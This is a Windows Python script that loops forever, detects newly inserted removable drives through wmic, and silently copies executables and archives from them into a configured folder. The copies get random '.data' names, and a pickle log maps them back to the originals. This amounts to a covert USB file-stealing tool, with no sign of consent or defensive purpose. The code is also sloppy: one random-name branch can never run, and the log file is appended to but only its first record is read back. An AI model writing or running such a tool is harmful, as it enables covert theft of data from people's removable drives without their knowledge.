import os
import time
import subprocess
import shutil
from random import randint
from pickle import load, dump
try:

    with open("config.ini", "r")as f:
        t=[]
        for i in range(2):
            p=f.readline(-1)
            if "None"in p:
                t.append(None)
            else:
                t.append(p)
        x=f.readline(-1)
        t2=[]
        while x.find(',')!=-1:
            t2.append(x[:x.find(',')])
            x=x[x.find(',')+1:]
        t2.append(x)
        t.append(t2)
except:
    exit(2)


def checkdrive():
    tes = True
    while tes:
        time.sleep(1)
        ot = subprocess.check_output(
            'wmic logicaldisk get caption, drivetype', shell=True)
        data = str(ot)
        
        if data.find("2") != -1:
            cvt = data.find("2")
            d = cvt-9
            get = data[d:cvt]
            fin = get[:2]
            copy_spe(fin, t[0],int(t[1]),t[2])
            tes = False


def rands():
    ch = ""
    for i in range(19):
        x = randint(0, 2)
        if x == 0:
            ch += chr(randint(ord("a"), ord("z")))
        elif x == 0:
            ch += chr(randint(ord("A"), ord("Z")))
        else:
            ch += chr(randint(ord("0"), ord("9")))
    return ch+".data"


def copy_spe(so, dis, maxs=None, exte=None):
    if maxs==None:
        maxs=50
    if exte == None:
        exte = [".exe", ".rar", ".zip"]
    try:
        with open("das.dat", "rb") as f:
            cops = load(f)
    except:
        cops = []
    copf = get_des(t[0], cops)
    for r, d, f in os.walk(so):
        for fi in f:
            fip = os.path.join(r, fi)
            fis = os.path.getsize(fip)/(1024*1024)
            fiex = os.path.splitext(fi)[1].lower()
            if fis <= maxs and fiex in exte:
                disp = os.path.join(dis, fi)
                disp2 = os.path.join(dis, rands())
                e = dict()
                e["original"] = disp
                e["fake"] = disp2
                if disp not in copf:
                    try:
                        shutil.copy(fip, disp2)
                        copf.append(disp)
                        cops.append(e)
                    except:
                        pass

    with open("das.dat", "ab")as f:
        dump(cops, f)

    print(copf)


def get_des(x, desa):
    chs = []
    for root, dirs, files in os.walk(x):
        for file in files:
            fp = os.path.join(root, file)
            chs.append(fp)
    des = []
    print(chs)
    for i in desa:
        print(i["fake"])
        if i["fake"] in chs:
            des.append(i["original"])
    print("-----------------------------------------------")
    return des


while True:
    checkdrive()
    time.sleep(5)
